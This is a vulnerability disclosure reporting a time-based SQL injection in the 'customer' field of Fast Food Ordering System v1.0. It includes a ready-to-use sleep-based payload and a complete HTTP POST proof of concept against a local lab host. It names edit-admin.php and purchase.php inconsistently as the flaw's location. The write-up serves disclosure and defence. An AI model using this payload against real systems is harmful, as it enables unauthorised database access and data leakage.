# Vulnerability Description

[Fast Food Ordering System v1.0](https://www.campcodes.com/projects/php/creating-an-admin-side-fast-food-ordering-system/) was discovered to contain a SQL injection vulnerability via the edit-admin.php. It is an open source project from [campcodes.com](https://www.campcodes.com). This vulnerability can lead to database information leakage.

1. Vulnerability Submitter: Tr0e
  
2. vendors: [Fast Food Ordering System v1.0](https://www.campcodes.com/projects/php/creating-an-admin-side-fast-food-ordering-system/);
  
3. The program is built using the xmapp/v3.3.0 and PHP/8.1.10 version;
  
4. Vulnerability location: /fastfood/purchase.php
  

# Vulnerability Verification

[+] Payload:

```java
test'and(select*from(select+sleep(3))a/**/union/**/select+1)='
```

POC：

```js
POST /fastfood/purchase.php HTTP/1.1
Host: 192.168.0.111:91
Content-Length: 259
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.0.111:91
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.0.111:91/fastfood/order.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: PHPSESSID=rbcvgagjbbad1bbrbb62nukgmc
Connection: close

quantity_0=&quantity_1=&quantity_2=&quantity_3=&quantity_4=&quantity_5=&quantity_6=&quantity_7=&quantity_8=&quantity_9=&quantity_10=&quantity_11=&productid%5B%5D=23%7C%7C12&quantity_12=10&customer=test'and(select*from(select+sleep(3))a/**/union/**/select+1)='
```

## How to verify

Build the vulnerability environment according to the steps provided by the source code author and execute the poc provided above.

The vulnerability is located at the "Order - Save" function, you shuold inserts Payload when you save order，as shown in the following figure：
![image](https://user-images.githubusercontent.com/42080954/194589803-3460f25d-529a-4157-b8c8-fbed8095238b.png)
![image](https://user-images.githubusercontent.com/42080954/194590058-4348bd1b-daa3-492d-bcb0-b2a25ebc6144.png)

